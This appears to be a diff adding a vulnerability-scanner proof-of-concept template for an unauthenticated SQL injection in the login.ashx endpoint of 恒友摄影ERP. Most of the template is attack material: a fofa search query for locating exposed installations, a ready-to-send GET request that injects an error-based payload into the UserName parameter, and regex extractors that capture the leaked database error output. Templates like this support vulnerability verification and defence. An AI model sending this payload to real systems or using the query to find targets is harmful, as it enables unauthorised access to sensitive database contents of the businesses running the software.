@@ -1,0 +1,19 @@
+## id: VEID-2025-1203
+## name: 恒友摄影ERPlogin.ashx存在SQL注入
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2025
+## description: 恒友摄影ERP的/ashx/login.ashx接口存在SQL注入漏洞，未经身份验证的攻击者可利用该漏洞构造恶意SQL语句，绕过登录验证，直接获取数据库中的敏感信息。
+## reference: https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E6%81%92%E5%8F%8B%E6%91%84%E5%BD%B1ERP/%E6%81%92%E5%8F%8B%E6%91%84%E5%BD%B1ERP%E7%9A%84login.ashx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
+## fofa-query: body="BookChooseDateOrder.html"
+## verification: true
+
+
+GET /ashx/login.ashx?Method=ValidateLogin&ShopID=F0&UserName=admin%27+AND+1=@@VERSION--&UserPwd=1 HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: or
+#> extract: name=error_user, from=body, regex=/用户\s*\'?([^\'\"\s]+)/
+#> extract: name=error_desc, from=body, regex=/出错了！ 错误描述：([^"]+)/
+
